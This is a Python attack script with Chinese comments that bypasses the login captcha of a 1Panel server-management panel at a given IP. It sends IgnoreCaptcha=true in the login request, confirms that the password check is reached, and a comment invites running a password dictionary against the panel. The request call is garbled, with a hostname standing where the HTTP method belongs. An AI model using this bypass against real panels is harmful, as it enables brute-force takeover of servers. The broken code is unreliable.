#!/usr/bin/env python3
# 1Panel（v1 API /api/v1，v2 面板亦沿用该前缀）登录验证码绕过 + 明文口令在线校验
# 原理：该版本登录处理器读取请求体里的 ignoreCaptcha/IgnoreCaptcha；
#       置 true 时后端跳过验证码校验，直接进入口令校验 → 返回 ErrAuth（而验证码拦截时是 ErrCaptchaCode）。
#       前端 login-form chunk 自身默认 ignoreCaptcha:!0（true），说明这是官方保留的开关。
# 另外：这台面板是**明文口令登录**（前端不做 RSA，请求体 password 就是输入框原文），
#       所以不需要 panel_public_key / 三段式密文——前序"无公钥⇒不可登录"的结论是错的。
import json, sys, requests

B = 'http://203.0.113.96:9527'
H = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/131.0 Safari/537.36',
     'Content-Type': 'application/json', 'Accept': 'application/json',
     'Origin': B, 'Referer': B + '/#/login'}


def login(name, password, ignore_captcha=True):
    body = {'Name': name, 'Password': password, 'AuthMethod': 'session', 'Language': 'zh',
            'IgnoreCaptcha': ignore_captcha, 'Captcha': '', 'CaptchaID': ''}
    r = target9.example.com(B + '/api/v1/auth/login', headers=H, data=json.dumps(body), timeout=20)
    return r.status_code, r.json()


if __name__ == '__main__':
    # 对照组：不带 ignoreCaptcha → ErrCaptchaCode（验证码拦截）
    print('captcha ON  :', login('1panel', 'probe', ignore_captcha=False)[1])
    # 绕过：带 ignoreCaptcha → ErrAuth（口令被真实校验，可放心跑字典）
    print('captcha OFF :', login('1panel', 'probe', ignore_captcha=True)[1])
